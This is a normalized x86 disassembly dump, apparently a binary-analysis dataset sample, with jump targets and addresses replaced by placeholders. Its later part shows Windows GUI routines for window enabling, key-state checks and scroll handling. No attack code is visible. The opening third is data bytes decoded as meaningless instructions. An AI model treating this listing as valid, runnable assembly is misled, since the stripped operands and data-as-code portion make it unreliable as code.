mov al [ 0x42840044 ]
inc esi
add ah dh
retn 0x44
add [ ebx + esi ] bl
inc esi
add [ esi + ecx ] al
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
xchg edx eax
inc esp
add [ eax + 0x24004508 ] al
aas
inc esi
add [ eax + 0x44004505 ] al
xchg edx eax
inc esp
add [ eax - 0x6e ] cl
inc esp
add [ eax ] bl
inc eax
inc esi
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ edx + eax * 2 ] cl
inc esi
add al bl
inc eax
inc esi
add [ eax + 0x44 ] cl
add [ edx + eax * 2 - 0x3d0bffba ] al
inc esp
add [ esi + eax ] cl
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ ecx + esi ] ah
inc esi
add [ eax ] ch
dec ecx
inc esi
add [ eax - 0x24 ] al
inc esp
add ah ch
push ebp
inc esi
add [ ecx + ebx * 2 + 0x46 ] cl
add [ eax ] cl
pop eax
inc esi
add al bl
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x7c ]
pop edx
inc esi
add [ ebx + ebx * 8 ] bh
inc esp
add ah ch
pop es
inc ebp
add [ eax + 0x61 ] bh
inc esi
add al ah
sbb [ ebp ] eax
xor [ eax * 2 + 0x46768c00 ] al
add [ eax ] bl
sub eax [ esi ]
enter 0x462d 0x0
insb
inc esi
add [ eax + 0x24004637 ] ch
cmp [ esi ] al
insb
jpe r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x63410600
je r-xdata
add al ah
xor al 0x46
add [ eax + 0x75 ] dh
inc esi
add [ eax + 0x5c ] dl
inc esi
add [ edi + esi * 2 ] ah
inc esi
add [ eax ] cl
inc edx
inc esi
add [ 0x726f4654 ] al
insd
mov eax eax
pushad
pop es
inc esi
add [ edi ] al
add eax 0x726f4654
insd
pushad
push es
inc esi
add al dh
add eax 0x5e0046
add eax 0x6d726f46
jae r-xdata
popad
inc edx
insb
outsb
insb
adc [ eax ] al
loope r-xdata
outsd
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
inc [ eax + 0x7f ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
outsb
clc
pushad
inc esp
add [ eax ] ah
add al [ eax ]
[ ebx + ebx * 2 ]
add [ eax ] ch
xchg ecx eax
inc ecx
add [ eax + eax ] bh
add dh bh
sub al 0x93
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000d ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
jg r-xdata
add bh bh
add [ eax ] al
add al [ eax ]
push [ esp + ebp + 0x46 ]
add [ eax + 0x463e ] dl
add [ eax ] al
add [ ecx ] 0x0
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
outsd
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
outsd
js r-xdata
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
add [ eax + 0x1 ] al
cmc
inc ebp
add [ ecx ] ch
add al [ eax ]
jmp eax
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
fsub [ eax + 0x44 ]
add [ eax - 0x80000000 ] al
adc eax 0x69420800
inc esp
imul ecx [ ebp + 0x6f ] 0x586564
inc esi
add [ eax ] ch
add al [ eax ]
push [ edx + ecx * 2 + 0x4dac0046 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
pop esp
add [ eax ] al
inc esp
add [ ecx ] ah
add bh bh
or al 0x93
inc esp
add [ eax + 0x4493 ] ch
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ ecx + 0x46 ] al
insb
call 0x7d4509ca
jg r-xdata
add [ eax + 0x3e ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
add [ edx + 0x41300044 ] bl
inc esi
add [ eax + 0x3e ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40105474
add [ ecx + ebx * 4 + 0x41000044 ] bh
jb r-xdata
jae r-xdata
arpl [ edi + 0x6e ] bp
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
mov ah 0x4a
inc esi
add [ ebp + ecx * 2 + 0x46 ] ch
add [ eax + 0x7 ] al
add [ eax ] dl
inc eax
add [ eax ] dl
popad
outsb
jae r-xdata
cwde
push ss
inc edx
add [ eax ] dh
add bh bh
pop eax
mov eax [ 0xffffffffa1740044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
inc esi
popad
jo r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
mov eax 0xe800449f
lahf
inc esp
add [ ebp + ecx * 2 + 0x46 ] ch
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
pop es
inc ebx
push ebp
jae r-xdata
popad
jb r-xdata
adc [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
and [ eax ] eax
push cs
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
and [ esi + 0x44 ] cl
add [ eax + eax ] dh
dec [ esp + eax * 8 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ ebx ] cl
inc ebx
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x6cff0001 ] ah
or al [ ebp ]
sbb [ ecx ] cl
inc ebp
add [ ecx + ecx ] bh
outsb
je r-xdata
dec ebp
inc esi
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ esi ] eax
xor [ edx ] eax
add bh bh
xor [ edx ] eax
add bh bh
lodsb [ esi ]
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
insb
outsd
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
je r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
aam 0x4c
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x18ff0001 ] ah
or [ ebp ] eax
cmp al 0x9
push ss
inc edx
add ah ch
add al [ eax ]
[ eax + 0x7f ]
dec esp
inc esp
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
outsd
outsb
add [ eax ] al
jb r-xdata
test al 0x1
add bh bh
jl r-xdata
adc [ eax ] al
sub_461930
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_46197c
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46b21c
mov eax [ rw-data ]
call sub_420264
mov eax [ rw-data ]
call sub_42020c
retn
push 0x0
push eax
call ShowOwnedPopups
sub_4619b4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4027c4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_461a04
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_461aa7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_461a70
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_4619b4
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461aae
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_461ab8
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4027e4
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_461af0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_461b54
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_461af0
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_461bb0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_461bd0
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_461bb0
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_461bfc
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_468754
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_468bc4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_408180
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_468740
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_468bb0
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_408180
test eax eax
je r-xdata
sub_461c7c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_461cd0
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_461d0c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_461d58
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_461db6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45ee54
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_40418c
mov eax [ ebp - 0x8 ]
pop edx
call sub_408180
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461dbd
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
sub_461dc8
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_461df0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_461e61
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_461dc8
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461e68
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
sub_461e70
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403224
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_461f00
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41abc8
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_4627c8
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_4627a8
mov edx [ edi + 0xc ]
mov eax ebx
call sub_462658
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_461f50
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_462108
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_44a62c
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_462658
xor edx edx
mov eax ebx
call sub_462658
jmp r-xdata
sub_461f88
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42b20c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_461ff4
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42b20c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_46205c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_462790
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44d4d0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_462790
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_44d494
call sub_461ff4
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_44d494
call sub_461f88
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_462108
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_4507d8
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_462140
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4507d8
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_462174
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_462140
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_462140
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_4621f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4507d8
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_462174
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4499bc
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_462174
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_449a00
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_462288
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4507d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_4622e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_4624b9 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_462658
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_462658
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4621f0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_462658
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4621f0
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_462658
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_462658
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_462658
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_462658
jmp r-xdata
push ebp
call sub_462288
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_462658
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_462658
jmp r-xdata
push ebp
call sub_462288
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_462658
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406e10
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
